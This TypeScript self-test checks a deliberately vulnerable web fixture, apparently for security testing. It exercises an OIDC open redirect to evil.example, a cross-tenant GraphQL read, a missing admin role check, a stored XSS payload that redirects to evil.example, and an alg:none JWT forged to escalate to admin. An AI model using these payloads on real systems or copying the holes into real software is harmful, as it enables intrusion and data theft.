// Self-test for Fixture #1 — proves every intended behaviour with raw HTTP and a
// browser-free DOM assertion for the authenticated admin view.
import assert from 'node:assert/strict'
import { start } from './index.ts'
import { findAll, inlineHandlers, parseHtml, textOf } from '../../lib/dom.ts'
import { decodeJwt } from '../../lib/tokens.ts'

function b64(value: unknown): string {
  return Buffer.from(JSON.stringify(value)).toString('base64url')
}

export async function runSelfTest(): Promise<string[]> {
  const checks: string[] = []
  const fixture = await start()
  const { app, api, idp, assets } = fixture.origins

  try {
    // 1. OIDC discovery + JWKS
    const discoveryRes = await fetch(`${idp}/.well-known/openid-configuration`)
    assert.equal(discoveryRes.status, 200)
    const discovery = (await discoveryRes.json()) as { issuer: string; authorization_endpoint: string; jwks_uri: string }
    assert.equal(discovery.issuer, idp)
    assert.equal(discovery.authorization_endpoint, `${idp}/authorize`)
    const jwks = (await (await fetch(discovery.jwks_uri)).json()) as { keys: Array<{ kid: string; alg: string }> }
    assert.equal(jwks.keys[0].alg, 'RS256')
    checks.push('oidc discovery + rs256 jwks')

    // 2. Interactive OIDC redirect login sets an HttpOnly cookie
    const login = await fetch(`${app}/login?user=alice@alpha.example.invalid`, { redirect: 'manual' })
    assert.equal(login.status, 302)
    const authorizeUrl = login.headers.get('location') ?? ''
    assert.ok(authorizeUrl.startsWith(`${idp}/authorize`), 'login redirects to the external IdP')
    const authorize = await fetch(authorizeUrl, { redirect: 'manual' })
    assert.equal(authorize.status, 302)
    const callbackUrl = authorize.headers.get('location') ?? ''
    assert.ok(callbackUrl.startsWith(`${app}/callback`), 'IdP redirects back to the app callback')
    const callback = await fetch(callbackUrl, { redirect: 'manual' })
    assert.equal(callback.status, 302)
    const setCookie = callback.headers.get('set-cookie') ?? ''
    assert.match(setCookie, /HttpOnly/i)
    const cookie = setCookie.split(';')[0]
    const dashboard = await fetch(`${app}/dashboard`, { headers: { cookie } })
    const dashboardHtml = await dashboard.text()
    assert.equal(dashboard.status, 200)
    assert.match(dashboardHtml, /alice@alpha\.example\.invalid/)
    checks.push('oidc redirect + HttpOnly session cookie')

    // 3. IdP redirect_uri is not allowlisted (open redirect)
    const evil = await fetch(
      `${idp}/authorize?client_id=kovo-spa&response_type=code&redirect_uri=${encodeURIComponent('https://evil.example/steal')}&login_hint=alice@alpha.example.invalid`,
      { redirect: 'manual' },
    )
    assert.equal(evil.status, 302)
    assert.ok((evil.headers.get('location') ?? '').startsWith('https://evil.example/steal'))
    checks.push('idp authorize open redirect')

    // 4. CDN manifest + shell wiring across split hosts
    const manifest = (await (await fetch(`${assets}/manifest.json`)).json()) as { chunks: string[] }
    assert.ok(manifest.chunks.length >= 4)
    const shell = await (await fetch(`${app}/`)).text()
    assert.match(shell, new RegExp(`${assets.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}/chunks/app\\.js`))
    assert.match(shell, new RegExp(`data-api="${api.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}"`))
    checks.push('cdn manifest + split-origin shell')

    const alice = fixture.personas.find((p) => p.id === 'u-alpha-1')!
    const headers = {
      authorization: `Bearer ${alice.token}`,
      'x-tenant-id': alice.tenant,
      'content-type': 'application/json',
    }

    // 5. GraphQL introspection disabled
    const intro = await fetch(`${api}/api/graphql`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ query: '{ __schema { types { name } } }' }),
    })
    const introBody = (await intro.json()) as { errors?: Array<{ message: string }> }
    assert.match(introBody.errors?.[0]?.message ?? '', /introspection is disabled/i)
    checks.push('graphql introspection disabled')

    // 6. Cross-tenant GraphQL member read (vulnerable) vs tenant-scoped REST profile (decoy)
    const cross = await fetch(`${api}/api/graphql`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ query: '{ member(id: "u-beta-1") { id email tenant } }' }),
    })
    const crossBody = (await cross.json()) as { data?: { member?: { email: string; tenant: string } } }
    assert.equal(crossBody.data?.member?.tenant, 'tenant-beta')
    assert.match(crossBody.data?.member?.email ?? '', /bob@beta/)
    const profile = await fetch(`${api}/api/profile`, {
      headers: { ...headers, 'x-tenant-id': 'tenant-beta' },
    })
    assert.equal(profile.status, 403)
    checks.push('graphql cross-tenant read + scoped profile decoy')

    // 7. Authenticated member reaches the admin export (missing role check)
    const exportRes = await fetch(`${api}/api/admin/export`, { headers })
    const exportBody = (await exportRes.json()) as { rows: Array<{ email: string }>; canary: string }
    assert.equal(exportRes.status, 200)
    assert.ok(exportBody.rows.some((row) => row.email.includes('bob@beta')))
    assert.equal(exportBody.canary, 'rbs_fake_beta_export_canary')
    checks.push('member reaches admin export (BFLA)')

    // 8. Stored XSS renders only in the authenticated admin browser view
    const payload = '<img src=x onerror="document.location=\'//evil.example/c\'">'
    const created = await fetch(`${api}/api/notes`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ body: payload }),
    })
    assert.equal(created.status, 201)
    const aliceCookie = fixture.browserCookie('u-alpha-1')
    const adminCookie = fixture.browserCookie('admin')
    const memberView = parseHtml(await (await fetch(`${app}/inbox`, { headers: { cookie: aliceCookie } })).text())
    assert.equal(inlineHandlers(memberView).length, 0, 'member view escapes stored markup')
    const memberText = textOf(memberView)
    assert.match(memberText, /&lt;img src=x/)
    assert.match(memberText, /evil\.example/)
    const adminView = parseHtml(await (await fetch(`${app}/admin?tab=inbox`, { headers: { cookie: adminCookie } })).text())
    const handlers = inlineHandlers(adminView)
    assert.equal(handlers.length, 1, 'admin view renders exactly one inline handler')
    assert.equal(handlers[0].tag, 'img')
    assert.match(handlers[0].attrs.onerror ?? '', /evil\.example/)
    const tabs = findAll(parseHtml(await (await fetch(`${app}/dashboard`, { headers: { cookie: adminCookie } })).text()), (n) => n.attrs['data-tab'] === 'inbox')
    assert.equal(tabs.length, 1)
    const modal = await fetch(`${app}/admin/modal/member/u-beta-1`, { headers: { cookie: adminCookie } })
    assert.equal(modal.status, 200)
    assert.match(await modal.text(), /role="dialog"/)
    checks.push('stored xss: escaped for member, rendered for admin')

    // 9. alg:none token refresh escalates to admin
    const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: 'u-alpha-1', role: 'admin', tenant: 'tenant-alpha', email: 'alice@alpha.example.invalid' })}.`
    const refresh = await fetch(`${api}/api/session/refresh`, {
      method: 'POST',
      headers: { authorization: `Bearer ${forged}`, 'content-type': 'application/json' },
      body: '{}',
    })
    const refreshBody = (await refresh.json()) as { access_token: string; role: string }
    assert.equal(refresh.status, 200)
    assert.equal(refreshBody.role, 'admin')
    assert.equal(decodeJwt(refreshBody.access_token)?.payload.role, 'admin')
    const escalated = await fetch(`${api}/api/admin/export`, {
      headers: { authorization: `Bearer ${refreshBody.access_token}` },
    })
    assert.equal(escalated.status, 200)
    checks.push('alg:none refresh escalates role')

    // 10. Unauthenticated admin route stays closed
    assert.equal((await fetch(`${app}/admin?tab=inbox`)).status, 403)
    checks.push('admin view requires authentication')
  } finally {
    await fixture.stop()
    await fixture.stop()
  }
  return checks
}
